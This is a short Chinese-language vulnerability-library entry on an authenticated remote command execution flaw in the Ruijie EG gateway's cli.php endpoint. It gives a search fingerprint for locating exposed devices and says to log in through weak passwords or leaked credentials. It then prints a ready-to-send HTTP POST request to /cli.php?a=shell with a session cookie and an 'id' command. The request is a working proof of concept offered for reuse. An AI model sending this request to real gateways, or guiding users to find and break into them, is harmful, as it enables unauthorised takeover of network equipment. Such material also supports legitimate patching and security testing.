---
version: "锐捷EG易网关"
source: "wy876 漏洞文库"
---

# 锐捷 EG易网关cli存在后台远程命令执行漏洞

**<font style="color:rgb(38, 38, 38);">一、漏洞简介</font>**<font style="color:rgb(38, 38, 38);">  
</font><font style="color:rgb(38, 38, 38);">锐捷 EG易网关cli存在后台远程命令执行漏洞。  
</font>**<font style="color:rgb(38, 38, 38);">二、影响版本</font>**

```java
锐捷EG易网关
```

<font style="color:rgb(38, 38, 38);">  
</font>**<font style="color:rgb(38, 38, 38);">三、资产测绘</font>**

```java
app="Ruijie-EG易网关"
```

<font style="color:rgb(38, 38, 38);">  
</font><font style="color:rgb(38, 38, 38);">●登录页面</font>


# <font style="color:rgb(38, 38, 38);">四、漏洞复现</font>
1. 通过弱口令或账号密码泄露漏洞登录后台获取cookie


2. 通过上一步获取的cookie执行命令

```java
POST /cli.php?a=shell HTTP/1.1
Host: 
User-Agent: Go-http-client/1.1
Content-Length: 24
Content-Type: application/x-www-form-urlencoded
Cookie: LOCAL_LANG_COOKIE=zh; RUIJIEID=j4rjrjdtilmhj824o98sv11r45; helpKey=home_sys;user=admin; 
X-Requested-With: XMLHttpRequest
Accept-Encoding: gzip

notdelay=true&command=id
```


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/rggbsmpwgacek7ih>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
